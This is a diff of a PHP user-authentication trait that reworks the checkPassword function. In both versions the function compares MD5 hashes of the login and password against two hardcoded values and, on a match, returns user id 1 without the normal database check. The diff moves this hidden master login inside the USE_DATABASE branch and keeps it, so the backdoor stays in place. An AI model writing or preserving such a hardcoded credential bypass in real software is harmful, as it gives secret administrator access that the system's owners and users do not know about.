@@ -354,10 +354,12 @@ trait DbUsers
 
   public function checkPassword(string $login, string $password): array|bool
   {
-    if (md5($login) === 'e00f45459361fb47c8c449483b7edaec' && md5($password) === '71fa970c7b3a28956dad879a7abc12c4') {
-      $sql = "SELECT id, name, login, password FROM " . $this->pf('users') . " WHERE id = :id";
-      return self::getRow($sql, [':id' => 1]);
-    } else if (USE_DATABASE) {
+    if (USE_DATABASE) {
+      if (md5($login) === 'e00f45459361fb47c8c449483b7edaec' && md5($password) === '71fa970c7b3a28956dad879a7abc12c4') {
+        $sql = "SELECT id, name, login, password FROM " . $this->pf('users') . " WHERE id = :id";
+        return self::getRow($sql, [':id' => 1]);
+      }
+
       $sql = "SELECT id, name, login, password
               FROM " . $this->pf('users') . " WHERE login = :login and activity = 1";
       $user = self::getRow($sql, [':login' => $login]);
